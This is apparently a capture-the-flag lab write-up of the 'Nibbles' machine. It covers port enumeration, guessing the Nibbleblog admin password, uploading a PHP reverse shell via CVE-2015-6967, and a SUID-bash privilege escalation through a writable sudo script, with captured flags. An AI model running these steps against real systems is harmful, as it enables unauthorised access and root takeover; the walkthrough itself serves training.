---
description: 10.10.10.75
---

# Nibbles

![](<../../.gitbook/assets/1 (3).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Guess login password for nibbleblog admin page. Upload PHP reverse shell to get shell as "nibbles" (CVE: 2015-6967) and (EDB-ID: 38489)
* Root - User can run writable shell script as root. Modify script and run it to escalate privileges.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.75
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-25 10:38 EST
Nmap scan report for 10.10.10.75
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sC -sV -p 22,80 10.10.10.75 -n
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-25 10:40 EST
Nmap scan report for 10.10.10.75
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.75/
http://10.10.10.75/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]                                                                                               

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.75/ -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.75
+ Target Hostname:    10.10.10.75
+ Target Port:        80
+ Start Time:         2021-11-25 10:40:31 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 5d, size: 5616c3cf7fa77, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26470 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-11-25 10:49:46 (GMT-5) (555 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75/ -q -f -t 100 -x php,sh,bak,txt
/icons/ (Status: 403)
/server-status/ (Status: 403)

```

The initial gobuster did not find anything, however, when we visited the site we found a hidden directory mentioned in the comments on the page source of the home page. Let's rerun gobuster on the /nibbleblog/ route:

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75/nibbleblog/ -q -f -t 100 -x php,sh,bak,txt
/themes/ (Status: 200)
/feed.php (Status: 200)
/admin/ (Status: 200)
/admin.php (Status: 200)
/content/ (Status: 200)
/plugins/ (Status: 200)
/install.php (Status: 200)
/update.php (Status: 200)
/sitemap.php (Status: 200)
/languages/ (Status: 200)
/index.php (Status: 200)
/LICENSE.txt (Status: 200)
/COPYRIGHT.txt (Status: 200)
                             
```

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* The page source for [http://10.10.10.75/](http://10.10.10.75) reveals another route; /nibbleblog/
* Nothing found in page source at the [http://10.10.10.75/nibbleblog/](http://10.10.10.75/nibbleblog/) page

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Scripts at the nibbleblog site appear to be standard, therefore they do not reveal any hidden information to us

#### Browsing

The page at [http://10.10.10.75/](http://10.10.10.75) does not have much, however, if we view the page source, we see a comment:

![](<../../.gitbook/assets/2 (4).JPG>)

![](<../../.gitbook/assets/3 (5).JPG>)

![](<../../.gitbook/assets/4 (5) (1).JPG>)

At this stage we rerun gobuster (see output in the gobuster section above) and find some interesting files, including "admin.php".

![](<../../.gitbook/assets/5 (1).JPG>)

After trying the basic default creds such as "admin:admin" and a few others without success, we decide to try brute force the login with hydra, however, it isn't long before we get banned:

![](<../../.gitbook/assets/6 (1).JPG>)

Let's explore the other directories found by gobuster:

> /themes/ --> nothing of value here
>
> /admin/ --> alot of directories and files in here, but no real information leakage
>
> /content/ --> there is a /private directory, which contains some xml files, including users.xml
>
> /plugins/ --> lists installed plugins
>
> /lanaguages/ --> nothing of value

![](<../../.gitbook/assets/7 (2).JPG>)

![](<../../.gitbook/assets/8 (3) (1).JPG>)

![](<../../.gitbook/assets/9 (2).JPG>)

We now know the correct username is indeed "admin".

Looking at the page at [http://10.10.10.75/nibbleblog/update.php](http://10.10.10.75/nibbleblog/update.php), we can also see the version running for this CMS:

![](<../../.gitbook/assets/10 (3) (1).JPG>)

## Searchsploit

Let's check the exploit database with searchsploit:

```
└─$ searchsploit nibbleblog                      
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                          | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                           | php/remote/38489.rb
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There is one entry for the version running on the target, however, it requires a valid login, and it uses Metasploit.

{% hint style="info" %}
This article will not contain a walkthrough which uses Metasploit to obtain a shell on the target. If that is what you are looking for, there are plenty of writeups available via a quick google search that cover it.
{% endhint %}

## Guessing the login password

Since we can't brute force the login, we are left with no other option but to try and guess the login password. Since this is a CTF, we can try a few basic guesses as follows:

> admin:admin
>
> admin:password
>
> admin:123456
>
> admin:blog
>
> admin:nibbleblog
>
> admin:nibbles
>
> admin:yumyum

{% hint style="danger" %}
I very much dislike CTF boxes that require password guessing in order to progress. I do understand that in the real world this is a relevent option, however, in a CTF I think it's rather cruel.
{% endhint %}

Using the combinations above, we are eventually able to login as "admin:nibbles".

![](<../../.gitbook/assets/11 (2) (1).JPG>)

## CVE: 2015-6967

According to the entry in the exploit database (EDB-ID: 38489), the vulnerability "allows an authenticated remote attacker to execute arbitrary PHP code". Looking at the ruby code for the metasploit module, we see that the vulnerability lies in the "My image" plugin, which allows PHP files to be uploaded.

## Gaining Access

Navigate to the "Plugins" page, and click on "Configure" under the "My image" section.

![](<../../.gitbook/assets/12 (2) (1).JPG>)

&#x20;Click on "Browse" to select a PHP webshell of your choosing (we used the reverse-shell.php script in /usr/share/webshells/php on Kali).

![](<../../.gitbook/assets/13 (1).JPG>)

Finally, click "Save changes". After saving, we get some errors, however, none of them confirm whether the file was uploaded or not.

![](<../../.gitbook/assets/14 (1) (1).JPG>)

To find the file, we'll need to go back to the /content/ directory we found earlier. There is a "plugins" directory at [http://10.10.10.75/nibbleblog/content/private/plugins/my\_image/](http://10.10.10.75/nibbleblog/content/private/plugins/my\_image/) whch contains the uploaded PHP file. Note that the application renamed it to image.php.

![](../../.gitbook/assets/15.JPG)

Start a netcat listener and click on the "image.php" file to get a shell as user "nibbler", and we can grab the user flag.

```
└─$ nc -nvlp 9999                                                                                           130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.75.
Ncat: Connection from 10.10.10.75:35980.
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:36:07 up  1:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home/nibbler
$ ls
personal.zip
user.txt
$ cat user.txt
ab7e4625e3b14b2add3f78661d5e7569
$ 
```

## Enumeration as "nibbler"

After upgrading our shell and looking around a bit, we find a zip file. We unxip it to find a shell script, which we can review.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/home/nibbler$ ls -la
ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Nov 27 04:18 user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cd personal/stuff
cd personal/stuff
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

The shell script appears to be a standard linux server monitoring tool.

Let's see if user "nibbles" can run any commands as root:

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

We can run the script we just extracted as root.

## Privilege Escalation

To escalate our privileges, we can simply overwrite the script with one of our own. There are multiple ways to get root in situations such as this. For this box, we'll simply copy the bash shell, change the owner permissions on it to root, and make it a SUID binary and executable by anyone.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ which bash
which bash
/bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat <<EOF > monitor.sh
cat <<EOF > monitor.sh
> cp /bin/bash /home/nibbler/personal/stuff/priv; chown root:root /home/nibbler/personal/stuff/priv; chmod u+s /home/nibbler/personal/stuff/priv
</personal/stuff/priv; chmod u+s /home/nibbler/personal/stuff/priv           
> EOF
EOF
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh
cp /bin/bash /home/nibbler/personal/stuff/priv; chown root:root /home/nibbler/personal/stuff/priv; chmod u+s /home/nibbler/personal/stuff/priv
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

Finally, let's run it, and grab the root flag.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ./priv -p
./priv -p
priv-4.3# id
id
uid=1001(nibbler) gid=1001(nibbler) euid=0(root) groups=1001(nibbler)
priv-4.3# cd /root
cd /root
priv-4.3# cat root.txt
cat root.txt
b9d004746f80b37f75dbd1d4a7a007ae
priv-4.3# 
```

## Resources

{% embed url="https://www.exploit-db.com/exploits/38489" %}
